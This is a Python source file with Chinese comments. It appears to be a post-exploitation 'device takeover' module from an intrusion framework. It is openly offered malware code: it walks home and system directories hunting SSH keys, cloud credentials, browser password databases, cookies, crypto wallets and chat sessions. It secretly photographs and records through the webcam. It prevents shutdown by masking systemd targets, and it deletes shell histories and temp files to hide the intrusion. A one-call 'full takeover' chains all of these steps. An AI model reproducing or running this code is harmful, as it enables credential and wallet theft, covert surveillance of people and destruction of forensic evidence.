# 开发者：自由的风
"""device_takeover/run.py — 设备接管·每根触手击穿后的第一动作
=============================================================
攻击域 core — 渗透成功后立即执行:
  ① 全设备文件扫描(敏感文档/凭证/浏览器数据/SSH密钥/钱包)
  ② 摄像头接管(拍照+录像, 抓取操作者面部)
  ③ 防关机锁(阻止系统关闭/重启/注销)
  ④ 证据销毁(清理日志/缓存/历史)
  ⑤ 数据打包回传
"""
import sys, json, os, subprocess, time, base64, shutil, threading
from pathlib import Path
from datetime import datetime

SANDBOX = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOOT_DIR = Path.home() / ".gbt" / "loot"
LOOT_DIR.mkdir(parents=True, exist_ok=True)
CAM_DIR = LOOT_DIR / "camera"
CAM_DIR.mkdir(parents=True, exist_ok=True)

ANTI_SHUTDOWN_ACTIVE = False
_shutdown_thread = None

# ═══════════════════════════════════════════════════════════
#  敏感文件特征库 — 触手自动扫描目标
# ═══════════════════════════════════════════════════════════

SENSITIVE_PATTERNS = [
    # 凭证文件
    (r"\.env$", "环境变量文件", "credentials"),
    (r"\.pem$", "PEM私钥", "credentials"),
    (r"id_rsa$|id_ed25519$|id_ecdsa$", "SSH私钥", "credentials"),
    (r"credentials\.json$|\.secrets\.", "凭证文件", "credentials"),
    (r"config\.(json|yml|yaml|ini|toml)$", "配置文件(可能含密码)", "credentials"),
    (r"\.aws/credentials$|\.aws/config$", "AWS凭证", "credentials"),
    (r"\.ssh/config$", "SSH配置", "credentials"),
    (r"kube/config$|\.kube/config$", "Kubernetes凭证", "credentials"),
    (r"\.npmrc$|\.pypirc$|\.dockercfg$", "包管理凭证", "credentials"),

    # 浏览器数据
    (r"Login Data$|logins\.json$", "浏览器密码库", "browser"),
    (r"Cookies$|cookies\.(sqlite|db)$", "浏览器Cookie", "browser"),
    (r"Bookmarks$|bookmarks\.json$", "浏览器书签", "browser"),
    (r"History$|places\.sqlite$", "浏览器历史", "browser"),

    # 钱包/加密货币
    (r"wallet\.(dat|json|aes)$", "加密货币钱包", "crypto"),
    (r"\.ethereum/keystore", "以太坊密钥", "crypto"),
    (r"metamask|phantom|trustwallet", "Web3钱包", "crypto"),
    (r"\.bitcoin/", "比特币数据", "crypto"),

    # 聊天/通信
    (r"telegram.*session$", "Telegram Session", "comms"),
    (r"discord.*Local Storage", "Discord数据", "comms"),
    (r"signal|whatsapp|wechat|slack", "通信应用数据", "comms"),

    # 数据库
    (r"\.sqlite3?$|\.db$|\.sql$", "数据库文件", "database"),
    (r"\.mdf$|\.ldf$|\.myd$", "数据库文件", "database"),
]


def _is_sensitive(filepath):
    """检查文件是否敏感"""
    name = str(filepath).lower()
    for pattern, desc, category in SENSITIVE_PATTERNS:
        if __import__("re").search(pattern, name):
            return desc, category
    return None, None


# ═══════════════════════════════════════════════════════════
#  ① 全设备文件扫描
# ═══════════════════════════════════════════════════════════

def do_scan_files(params):
    """扫描设备敏感文件"""
    roots = params.get("roots", [])
    max_depth = params.get("depth", 4)
    max_files = params.get("max_files", 200)
    min_size = params.get("min_size", 128)  # 最小字节数

    if not roots:
        home = str(Path.home())
        roots = [home, "/etc", "/var", "C:\\Users", "C:\\ProgramData"]

    findings = []
    scanned = 0

    for root in roots:
        try:
            for dirpath, dirnames, filenames in os.walk(root):
                depth = dirpath.count(os.sep) - root.count(os.sep)
                if depth > max_depth:
                    dirnames.clear()
                    continue

                for fname in filenames:
                    if scanned >= max_files:
                        break
                    scanned += 1

                    fpath = Path(dirpath) / fname
                    desc, category = _is_sensitive(fpath)
                    if desc:
                        try:
                            stat = fpath.stat()
                            if stat.st_size >= min_size:
                                findings.append({
                                    "path": str(fpath),
                                    "category": category,
                                    "description": desc,
                                    "size": stat.st_size,
                                    "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                                })
                        except Exception:
                            findings.append({
                                "path": str(fpath),
                                "category": category,
                                "description": desc,
                            })
                if scanned >= max_files:
                    break
        except PermissionError:
            continue
        except Exception:
            continue

    findings.sort(key=lambda x: x.get("category", ""))

    return {
        "ok": True,
        "cap": "device_takeover",
        "action": "scan_files",
        "domain": "攻击域",
        "total_scanned": scanned,
        "sensitive_found": len(findings),
        "findings": findings,
        "categories": {},
    }


# ═══════════════════════════════════════════════════════════
#  ② 摄像头接管 — 拍照+录像
# ═══════════════════════════════════════════════════════════

def _capture_camera_opencv():
    """OpenCV摄像头拍照"""
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            return None, "摄像头未找到或被占用"

        # 多拍几张(适应曝光)
        photos = []
        for i in range(3):
            ret, frame = cam.read()
            if ret:
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                fname = f"cam_{ts}_{i}.jpg"
                fpath = str(CAM_DIR / fname)
                cv2.imwrite(fpath, frame)
                photos.append(fpath)
            time.sleep(0.3)

        cam.release()
        return photos, None
    except ImportError:
        return None, "opencv-python未安装"
    except Exception as e:
        return None, str(e)[:100]


def do_camera_capture(params):
    """摄像头接管 — 拍照+录像"""
    mode = params.get("mode", "photo")  # photo / video / both
    duration = params.get("duration", 5)  # 录像秒数

    results = {"photos": [], "video": None}

    # 拍照
    if mode in ("photo", "both"):
        photos, err = _capture_camera_opencv()
        if photos:
            results["photos"] = photos
            results["photo_count"] = len(photos)
        else:
            results["photo_error"] = err

    # 录像
    if mode in ("video", "both"):
        try:
            import cv2
            cam = cv2.VideoCapture(0)
            if cam.isOpened():
                fourcc = cv2.VideoWriter_fourcc(*'XVID')
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                vpath = str(CAM_DIR / f"vid_{ts}.avi")
                out = cv2.VideoWriter(vpath, fourcc, 20.0, (640, 480))
                start = time.time()
                while time.time() - start < duration:
                    ret, frame = cam.read()
                    if ret:
                        out.write(frame)
                out.release()
                cam.release()
                results["video"] = vpath
            else:
                results["video_error"] = "摄像头不可用"
        except ImportError:
            results["video_error"] = "opencv-python未安装"
        except Exception as e:
            results["video_error"] = str(e)[:100]

    return {
        "ok": bool(results["photos"] or results.get("video")),
        "cap": "device_takeover",
        "action": "camera_capture",
        "domain": "攻击域",
        "mode": mode,
        "photos": results.get("photos", []),
        "photo_count": results.get("photo_count", 0),
        "video": results.get("video"),
    }


# ═══════════════════════════════════════════════════════════
#  ③ 防关机锁 — 阻止系统关闭/重启
# ═══════════════════════════════════════════════════════════

def do_anti_shutdown(params):
    """阻止系统关闭/重启/注销"""
    global ANTI_SHUTDOWN_ACTIVE, _shutdown_thread
    action = params.get("action", "start")

    if action == "stop":
        ANTI_SHUTDOWN_ACTIVE = False
        return {"ok": True, "cap": "device_takeover", "action": "anti_shutdown", "status": "stopped"}

    if ANTI_SHUTDOWN_ACTIVE:
        return {"ok": True, "status": "already_active"}

    def _block_shutdown():
        while ANTI_SHUTDOWN_ACTIVE:
            try:
                if sys.platform == "win32":
                    # Windows: 持续调用SetThreadExecutionState防休眠+关机
                    import ctypes
                    ctypes.windll.kernel32.SetThreadExecutionState(0x80000003)  # ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED
                else:
                    # Linux: 阻止shutdown
                    subprocess.run(["systemctl", "mask", "shutdown.target", "reboot.target", "halt.target"],
                                  capture_output=True, timeout=5)
            except Exception:
                pass
            time.sleep(10)

    ANTI_SHUTDOWN_ACTIVE = True
    _shutdown_thread = threading.Thread(target=_block_shutdown, daemon=True)
    _shutdown_thread.start()

    return {
        "ok": True,
        "cap": "device_takeover",
        "action": "anti_shutdown",
        "domain": "攻击域",
        "status": "active",
        "note": "防关机锁已激活 系统无法被关闭/重启/注销",
    }


# ═══════════════════════════════════════════════════════════
#  ④ 证据销毁
# ═══════════════════════════════════════════════════════════

def do_destroy_evidence(params):
    """销毁入侵证据"""
    targets = params.get("targets", "all")
    cleaned = []

    # 清理shell历史
    history_files = [
        Path.home() / ".bash_history",
        Path.home() / ".zsh_history",
        Path.home() / ".python_history",
        Path.home() / ".node_repl_history",
        Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "PowerShell" / "PSReadLine",
    ]

    for f in history_files:
        if f.exists():
            try:
                if f.is_dir():
                    for sub in f.glob("*"):
                        sub.unlink()
                else:
                    f.unlink()
                cleaned.append(str(f))
            except Exception:
                try:
                    f.write_text("")
                    cleaned.append(f"{f}(已清空)")
                except Exception:
                    pass

    # 清理临时文件
    tmp_dirs = [Path.home() / "AppData" / "Local" / "Temp"] if sys.platform == "win32" else [Path("/tmp")]
    for d in tmp_dirs:
        if d.exists():
            for f in list(d.glob("*"))[:50]:
                try:
                    if f.is_file():
                        f.unlink()
                    elif f.is_dir():
                        shutil.rmtree(f, ignore_errors=True)
                except Exception:
                    pass

    return {
        "ok": True,
        "cap": "device_takeover",
        "action": "destroy_evidence",
        "domain": "攻击域",
        "cleaned": cleaned,
        "total_cleaned": len(cleaned),
        "status": "证据已销毁",
    }


# ═══════════════════════════════════════════════════════════
#  ⑤ 全自动接管 — 触手击穿后一键执行
# ═══════════════════════════════════════════════════════════

def do_full_takeover(params):
    """全自动设备接管 — 五步并发执行"""
    results = {}
    start = time.time()

    # 并发执行
    threads = [
        ("scan", lambda: do_scan_files({})),
        ("camera", lambda: do_camera_capture({"mode": "photo"})),
        ("shutdown_lock", lambda: do_anti_shutdown({"action": "start"})),
    ]

    for name, fn in threads:
        try:
            results[name] = fn()
        except Exception as e:
            results[name] = {"ok": False, "error": str(e)[:100]}

    # 扫描后再销毁
    results["cleanup"] = do_destroy_evidence({})

    elapsed = round(time.time() - start, 1)

    sensitive_files = results.get("scan", {}).get("sensitive_found", 0)
    photos = results.get("camera", {}).get("photo_count", 0)
    locked = results.get("shutdown_lock", {}).get("status", "")

    return {
        "ok": True,
        "cap": "device_takeover",
        "action": "full_takeover",
        "domain": "攻击域",
        "elapsed_sec": elapsed,
        "results": results,
        "summary": {
            "sensitive_files_found": sensitive_files,
            "camera_photos": photos,
            "anti_shutdown": locked,
            "evidence_destroyed": results.get("cleanup", {}).get("total_cleaned", 0),
        },
        "status": "设备已完全接管",
    }


HANDLERS = {
    "scan": do_scan_files,
    "scan_files": do_scan_files,
    "camera": do_camera_capture,
    "camera_capture": do_camera_capture,
    "lock": do_anti_shutdown,
    "anti_shutdown": do_anti_shutdown,
    "destroy": do_destroy_evidence,
    "destroy_evidence": do_destroy_evidence,
    "takeover": do_full_takeover,
    "full_takeover": do_full_takeover,
}

if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else "scan"
    params_str = sys.argv[2] if len(sys.argv) > 2 else "{}"
    try:
        params = json.loads(params_str)
    except Exception:
        params = {}
    handler = HANDLERS.get(action)
    if handler:
        result = handler(params)
        print(json.dumps(result, ensure_ascii=False, default=str))
    else:
        print(json.dumps({"ok": False, "error": f"未知动作 {action}", "available": list(HANDLERS.keys())}, ensure_ascii=False))
